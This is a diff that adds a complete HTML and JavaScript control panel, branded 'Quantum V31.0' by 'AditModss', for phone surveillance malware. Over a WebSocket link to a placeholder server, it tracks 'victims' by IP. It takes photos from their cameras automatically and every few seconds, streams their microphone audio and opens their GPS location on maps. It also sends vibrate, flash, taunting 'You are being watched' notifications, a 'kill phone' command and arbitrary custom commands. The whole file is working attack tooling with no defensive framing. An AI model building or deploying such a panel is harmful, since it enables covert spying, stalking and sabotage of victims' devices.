@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☠️ QUANTUM PANEL - AditModss</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#0a0a0a;color:#00ff41;font-family:'Courier New',monospace;padding:15px;min-height:100vh}
+        ::-webkit-scrollbar{width:8px;background:#111}
+        ::-webkit-scrollbar-thumb{background:#00ff41;border-radius:4px}
+        .container{max-width:1400px;margin:0 auto}
+        .header{display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00ff41;padding:10px 0 15px;margin-bottom:20px;flex-wrap:wrap}
+        .header h1{font-size:24px;text-shadow:0 0 30px rgba(0,255,65,0.3)}
+        .header .badge{color:#0f0;animation:blink 1s infinite;font-size:14px}
+        @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin-bottom:20px}
+        .stat-card{background:rgba(0,255,65,0.05);border:1px solid rgba(0,255,65,0.2);border-radius:8px;padding:12px;text-align:center}
+        .stat-card .num{font-size:28px;font-weight:bold;color:#fff}
+        .stat-card .label{font-size:11px;color:#666;margin-top:5px}
+        .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:12px;margin-bottom:20px}
+        .card{background:rgba(0,255,65,0.03);border:1px solid rgba(0,255,65,0.15);border-radius:10px;padding:15px}
+        .card h3{color:#fff;font-size:14px;margin-bottom:12px;border-bottom:1px solid rgba(0,255,65,0.1);padding-bottom:8px}
+        .btn{background:transparent;border:1px solid #00ff41;color:#00ff41;padding:8px 14px;border-radius:5px;cursor:pointer;font-size:12px;margin:3px;transition:0.2s;font-weight:bold;font-family:inherit}
+        .btn:hover{background:#00ff41;color:#000;box-shadow:0 0 25px rgba(0,255,65,0.2)}
+        .btn.danger{border-color:#ff0040;color:#ff0040}
+        .btn.danger:hover{background:#ff0040;color:#000}
+        .btn.warning{border-color:#ffaa00;color:#ffaa00}
+        .btn.warning:hover{background:#ffaa00;color:#000}
+        .btn:disabled{opacity:0.3;cursor:not-allowed}
+        .logs{background:rgba(0,0,0,0.6);border:1px solid rgba(0,255,65,0.1);border-radius:10px;padding:12px;height:250px;overflow-y:auto;margin-top:15px;font-size:12px}
+        .log-entry{padding:3px 0;border-bottom:1px solid rgba(0,255,65,0.03);color:#888}
+        .log-entry .time{color:#555;margin-right:10px}
+        .log-entry .action{color:#00ff41}
+        .log-entry .ip{color:#ffaa00}
+        .log-entry .error{color:#ff0040}
+        .victim-list{background:rgba(0,0,0,0.4);border:1px solid rgba(0,255,65,0.1);border-radius:10px;padding:12px;margin-top:15px}
+        .victim-item{display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid rgba(0,255,65,0.05);flex-wrap:wrap;gap:5px}
+        .victim-item .id{color:#fff;font-weight:bold}
+        .victim-item .ip{color:#ffaa00}
+        .victim-item .time{color:#555;font-size:11px}
+        .photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(120px,1fr));gap:8px;margin-top:10px}
+        .photo-grid img{width:100%;height:120px;object-fit:cover;border-radius:5px;border:1px solid rgba(0,255,65,0.2);cursor:pointer;transition:0.2s}
+        .photo-grid img:hover{transform:scale(1.05);border-color:#00ff41}
+        .modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;cursor:pointer}
+        .modal.active{display:flex}
+        .modal img{max-width:95%;max-height:95%;border:2px solid #00ff41;border-radius:10px}
+        .cmd-input{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+        .cmd-input input{flex:1;background:#111;border:1px solid rgba(0,255,65,0.2);color:#00ff41;padding:8px 12px;border-radius:5px;min-width:150px;font-family:inherit}
+        .cmd-input input:focus{outline:none;border-color:#00ff41}
+        .response-box{background:rgba(0,0,0,0.4);border:1px solid rgba(0,255,65,0.1);border-radius:5px;padding:10px;margin-top:8px;max-height:100px;overflow-y:auto;font-size:12px;color:#888}
+        .status-indicator{display:inline-block;width:10px;height:10px;border-radius:50%;margin-right:6px}
+        .status-online{background:#00ff41;box-shadow:0 0 15px rgba(0,255,65,0.5)}
+        .status-offline{background:#ff0040;box-shadow:0 0 15px rgba(255,0,64,0.5)}
+        @media(max-width:600px){.header h1{font-size:18px}.grid{grid-template-columns:1fr}.stats{grid-template-columns:1fr 1fr}}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>☠️ QUANTUM V31.0 PANEL</h1>
+            <div>
+                <span class="badge">● ONLINE</span>
+                <span style="margin-left:15px;color:#555;font-size:12px">| © AditModss</span>
+            </div>
+        </div>
+
+        <div class="stats">
+            <div class="stat-card"><div class="num" id="victimCount">0</div><div class="label">VICTIMS</div></div>
+            <div class="stat-card"><div class="num" id="photoCount">0</div><div class="label">PHOTOS</div></div>
+            <div class="stat-card"><div class="num" id="logCount">0</div><div class="label">LOG ENTRIES</div></div>
+            <div class="stat-card"><div class="num" id="uptime">0s</div><div class="label">UPTIME</div></div>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <h3>📸 CAMERA & FLASH</h3>
+                <button class="btn" onclick="sendCmd('capture_photo')">📷 CAPTURE</button>
+                <button class="btn" onclick="sendCmd('flash_on')">💡 FLASH ON</button>
+                <button class="btn" onclick="sendCmd('flash_off')">💡 FLASH OFF</button>
+                <button class="btn warning" onclick="sendCmd('flash_toggle')">🔄 TOGGLE</button>
+                <button class="btn" onclick="sendCmd('capture_photo_continuous', {interval:5000})">🔄 AUTO 5s</button>
+                <button class="btn danger" onclick="sendCmd('stop_photo_continuous')">⏹ STOP AUTO</button>
+            </div>
+            <div class="card">
+                <h3>🎤 AUDIO & VIBRATE</h3>
+                <button class="btn" onclick="sendCmd('start_recording')">🎙 RECORD</button>
+                <button class="btn danger" onclick="sendCmd('stop_recording')">⏹ STOP REC</button>
+                <button class="btn" onclick="sendCmd('vibrate', {duration:1000})">📳 VIBRATE 1s</button>
+                <button class="btn" onclick="sendCmd('vibrate', {duration:3000})">📳 VIBRATE 3s</button>
+                <button class="btn warning" onclick="sendCmd('vibrate_pattern', {pattern:[200,100,200,100,500]})">📳 PATTERN</button>
+            </div>
+            <div class="card">
+                <h3>💀 DESTRUCTIVE</h3>
+                <button class="btn danger" onclick="if(confirm('KILL PHONE BOS?'))sendCmd('kill_phone')">💀 KILL PHONE</button>
+                <button class="btn" onclick="sendCmd('get_location')">📍 GET LOCATION</button>
+                <button class="btn" onclick="sendCmd('get_device_info')">📱 DEVICE INFO</button>
+                <button class="btn" onclick="sendCmd('fullscreen')">🖥 FULLSCREEN</button>
+                <button class="btn warning" onclick="sendCmd('notification', {title:'Quantum Alert',body:'You are being watched'})">🔔 NOTIF</button>
+            </div>
+            <div class="card">
+                <h3>⚡ QUICK COMMANDS</h3>
+                <div class="cmd-input">
+                    <input type="text" id="customCmd" placeholder="custom command..." onkeydown="if(event.key==='Enter')sendCustomCmd()">
+                    <button class="btn" onclick="sendCustomCmd()">▶ EXEC</button>
+                </div>
+                <div class="response-box" id="responseBox">Ready for commands...</div>
+                <button class="btn danger" onclick="clearAll()" style="margin-top:8px">🗑 CLEAR ALL DATA</button>
+            </div>
+        </div>
+
+        <div class="victim-list">
+            <h3 style="color:#fff;font-size:14px;margin-bottom:8px">👥 VICTIMS ONLINE</h3>
+            <div id="victimContainer">
+                <div class="victim-item"><span style="color:#666">Waiting for victims...</span></div>
+            </div>
+        </div>
+
+        <div style="margin-top:15px">
+            <h3 style="color:#fff;font-size:14px;margin-bottom:8px">🖼 CAPTURED PHOTOS</h3>
+            <div class="photo-grid" id="photoGallery"></div>
+        </div>
+
+        <div class="logs" id="logContainer">
+            <div class="log-entry"><span class="time">[SYSTEM]</span> <span class="action">Quantum Panel V31.0 Active</span></div>
+            <div class="log-entry"><span class="time">[SYSTEM]</span> <span class="action">Owner: AditModss</span></div>
+            <div class="log-entry"><span class="time">[SYSTEM]</span> <span class="action">Waiting for connections...</span></div>
+        </div>
+    </div>
+
+    <div class="modal" id="photoModal" onclick="this.classList.remove('active')">
+        <img id="modalImage" src="" alt="Captured Photo">
+    </div>
+
+    <script>
+        const WS_URL = 'wss://your-websocket-server.com';
+        let ws = null;
+        let victims = {};
+        let photos = [];
+        let logCount = 0;
+        let startTime = Date.now();
+        let selectedVictim = null;
+        let reconnectAttempts = 0;
+
+        function connectWS() {
+            try {
+                if (ws) ws.close();
+                
+                ws = new WebSocket(WS_URL);
+                
+                ws.onopen = function() {
+                    addLog('SYSTEM', '✅ WebSocket Connected');
+                    document.querySelector('.badge').textContent = '● ONLINE';
+                    document.querySelector('.badge').style.color = '#0f0';
+                    reconnectAttempts = 0;
+                };
+                
+                ws.onmessage = function(event) {
+                    try {
+                        const data = JSON.parse(event.data);
+                        handleData(data);
+                    } catch(e) {}
+                };
+                
+                ws.onclose = function() {
+                    document.querySelector('.badge').textContent = '● OFFLINE';
+                    document.querySelector('.badge').style.color = '#f00';
+                    addLog('SYSTEM', '❌ WebSocket Disconnected - Reconnecting...');
+                    reconnectAttempts++;
+                    const delay = Math.min(5000 * reconnectAttempts, 30000);
+                    setTimeout(connectWS, delay);
+                };
+                
+                ws.onerror = function(e) {};
+                
+            } catch(e) {
+                setTimeout(connectWS, 5000);
+            }
+        }
+
+        function handleData(data) {
+            const id = data.deviceId || 'unknown';
+            
+            if (!victims[id]) {
+                victims[id] = {
+                    id: id,
+                    ip: data.data?.ip || 'unknown',
+                    firstSeen: data.timestamp,
+                    lastSeen: data.timestamp,
+                    userAgent: data.userAgent || 'unknown'
+                };
+                updateVictims();
+                addLog('VICTIM', `🎯 New victim: ${victims[id].ip} (${id.substring(0,10)}...)`);
+                updateStats();
+            }
+            
+            victims[id].lastSeen = data.timestamp;
+            if (data.data?.ip) victims[id].ip = data.data.ip;
+            
+            if (data.action === 'photo_captured' && data.data?.image) {
+                photos.push({
+                    deviceId: id,
+                    image: data.data.image,
+                    timestamp: data.timestamp,
+                    ip: victims[id]?.ip || 'unknown'
+                });
+                if (photos.length > 50) photos.shift();
+                updatePhotos();
+                updateStats();
+                addLog('PHOTO', `📸 Photo from ${victims[id]?.ip || id}`);
+            }
+            
+            if (data.action === 'location_data') {
+                const loc = data.data;
+                addLog('LOCATION', `📍 ${victims[id]?.ip || id} → Lat:${loc.lat}, Lng:${loc.lng}`);
+                const url = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+                setTimeout(() => window.open(url, '_blank'), 500);
+            }
+            
+            if (data.action === 'audio_chunk' && data.data?.audio) {
+                addLog('AUDIO', `🎵 Audio chunk from ${victims[id]?.ip || id} (${Math.round((data.data.size||0)/1024)}KB)`);
+                try {
+                    const audio = new Audio(data.data.audio);
+                    audio.play().catch(() => {});
+                } catch(e) {}
+            }
+            
+            if (data.action === 'device_info') {
+                const info = data.data;
+                addLog('INFO', `📱 ${victims[id]?.ip || id} → ${info.userAgent?.substring(0,50)}...`);
+                document.getElementById('responseBox').innerHTML = 
+                    `Device: ${info.userAgent}<br>Screen: ${info.screen}<br>Language: ${info.language}`;
+            }
+            
+            if (data.action === 'victim_connected') {
+                addLog('STATUS', `✅ ${victims[id]?.ip || id} connected (${data.data?.screen || 'unknown'})`);
+                setTimeout(() => sendCmd('capture_photo', null, id), 2000);
+            }
+            
+            if (data.action.includes('error')) {
+                addLog('ERROR', `❌ ${data.action}: ${data.data?.error || 'Unknown error'}`);
+            }
+            
+            updateVictims();
+            updateStats();
+        }
+
+        function sendCmd(action, params = {}, target = null) {
+            const cmd = {
+                action: action,
+                target: target || 'all',
+                timestamp: Date.now()
+            };
+            
+            Object.assign(cmd, params);
+            
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify(cmd));
+                addLog('COMMAND', `📤 ${action} → ${target || 'all'}`);
+                document.getElementById('responseBox').innerHTML = `📤 Command sent: ${action}`;
+            } else {
+                addLog('ERROR', '❌ WebSocket not connected!');
+                document.getElementById('responseBox').innerHTML = '❌ WebSocket not connected!';
+            }
+        }
+
+        function sendCustomCmd() {
+            const input = document.getElementById('customCmd');
+            const val = input.value.trim();
+            if (!val) return;
+            
+            try {
+                const parsed = JSON.parse(val);
+                if (parsed.action) {
+                    sendCmd(parsed.action, parsed);
+                } else {
+                    sendCmd('custom', { command: val });
+                }
+            } catch(e) {
+                sendCmd('custom', { command: val });
+            }
+            input.value = '';
+        }
+
+        function updateVictims() {
+            const container = document.getElementById('victimContainer');
+            container.innerHTML = '';
+            
+            const ids = Object.keys(victims);
+            if (ids.length === 0) {
+                container.innerHTML = '<div class="victim-item"><span style="color:#666">No victims yet...</span></div>';
+                return;
+            }
+            
+            ids.forEach(id => {
+                const v = victims[id];
+                const div = document.createElement('div');
+                div.className = 'victim-item';
+                const isOnline = (Date.now() - v.lastSeen) < 30000;
+                div.innerHTML = `
+                    <span class="id">${isOnline ? '🟢' : '🔴'} ${v.ip || 'unknown'}</span>
+                    <span class="ip">${id.substring(0,12)}...</span>
+                    <span class="time">${new Date(v.lastSeen).toLocaleTimeString()}</span>
+                `;
+                container.appendChild(div);
+            });
+        }
+
+        function updatePhotos() {
+            const gallery = document.getElementById('photoGallery');
+            gallery.innerHTML = '';
+            
+            const recent = photos.slice(-20).reverse();
+            recent.forEach(p => {
+                const img = document.createElement('img');
+                img.src = p.image;
+                img.onclick = function() {
+                    document.getElementById('modalImage').src = this.src;
+                    document.getElementById('photoModal').classList.add('active');
+                };
+                img.title = `${p.ip || 'unknown'} - ${new Date(p.timestamp).toLocaleTimeString()}`;
+                gallery.appendChild(img);
+            });
+        }
+
+        function updateStats() {
+            document.getElementById('victimCount').textContent = Object.keys(victims).length;
+            document.getElementById('photoCount').textContent = photos.length;
+            document.getElementById('logCount').textContent = logCount;
+            const uptime = Math.floor((Date.now() - startTime) / 1000);
+            const minutes = Math.floor(uptime / 60);
+            const seconds = uptime % 60;
+            document.getElementById('uptime').textContent = `${minutes}m ${seconds}s`;
+        }
+
+        function addLog(type, message) {
+            const container = document.getElementById('logContainer');
+            const entry = document.createElement('div');
+            entry.className = 'log-entry';
+            const time = new Date().toLocaleTimeString();
+            entry.innerHTML = `<span class="time">[${time}]</span> <span class="action">[${type}]</span> ${message}`;
+            container.appendChild(entry);
+            container.scrollTop = container.scrollHeight;
+            logCount++;
+            updateStats();
+            
+            while (container.children.length > 200) {
+                container.removeChild(container.firstChild);
+            }
+        }
+
+        function clearAll() {
+            if (!confirm('Clear all data BOS?')) return;
+            photos = [];
+            victims = {};
+            logCount = 0;
+            document.getElementById('logContainer').innerHTML = '';
+            document.getElementById('photoGallery').innerHTML = '';
+            document.getElementById('victimContainer').innerHTML = '<div class="victim-item"><span style="color:#666">Cleared</span></div>';
+            addLog('SYSTEM', '🗑 All data cleared');
+            updateStats();
+        }
+
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') sendCustomCmd();
+            if (e.key === 'Escape') document.getElementById('photoModal').classList.remove('active');
+        });
+
+        setInterval(() => {
+            updateStats();
+            const now = Date.now();
+            let changed = false;
+            Object.keys(victims).forEach(id => {
+                if (now - victims[id].lastSeen > 60000 && victims[id]._timeout !== true) {
+                    victims[id]._timeout = true;
+                    changed = true;
+                }
+            });
+            if (changed) updateVictims();
+        }, 5000);
+
+        connectWS();
+        addLog('SYSTEM', '🔥 QUANTUM PANEL V31.0 READY');
+        addLog('SYSTEM', '💀 OWNER: AditModss');
+        addLog('SYSTEM', '📡 WebSocket: ' + WS_URL);
+        
+        console.log('🔥 QUANTUM V31.0 PANEL ACTIVE');
+        console.log('💀 OWNER: AditModss');
+    </script>
+</body>
+</html>
